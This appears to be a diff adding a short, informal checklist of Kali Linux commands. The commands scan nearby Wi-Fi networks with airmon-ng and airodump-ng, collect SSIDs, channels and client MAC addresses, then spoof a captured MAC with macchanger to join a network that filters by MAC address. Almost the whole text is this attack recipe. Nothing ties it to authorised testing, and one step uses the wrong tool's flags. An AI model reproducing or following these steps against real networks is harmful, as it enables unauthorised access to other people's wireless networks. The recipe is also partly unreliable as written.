@@ -1,0 +1,12 @@
+boot kali linux 
+open new terminal type sudo su 
+airmon-ng start wlan0 												#check tour interface wireless
+airodump-ng wlan0													#see ssid & macadress - copy SSID for next step - rememmber channel target , ssid macadress
+iwconfig wlan0 essid ... channel ...   								 #check can you connect to WIFI ?
+iwconfig wlan0  													 #can check whit this command (Not-Associated or Associated)
+airmon-ng -c ... -a --bssid ...(macadress) wlan0     					#you can snifing ssid and rememmber macadress
+airmon-ng stop wlan0    												#disable wlan0
+macchanger -m... wlan0												 #change your macadress to verfie macadress whit this 
+ifconfig wlan0 down
+ifconfig wlan0 up
+iwconfig wlan0 essid ... channel ...                           			#try to connect new ssid :-} Well done nerd
